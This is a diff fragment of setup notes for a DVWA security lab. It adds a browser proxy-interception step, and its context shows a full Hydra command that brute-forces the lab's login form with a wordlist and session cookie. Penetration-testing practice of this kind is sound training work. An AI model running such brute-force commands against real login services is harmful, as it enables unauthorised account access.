@@ -14,6 +14,8 @@ To setup:
 
 Within a browser: 
 1. Go to Network settings and set proxy address and the port to the noted down IP address and port number.
+2. Set allow intercept in about:config for network.proxy to be true.
+
 
 (Option 1) Run Hydra (a brute force tool):
 1. Run the following command: hydra <DVWA Ip address> -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low; PHPSESSIONID=eogppved743ckngeo0so6tnp87"
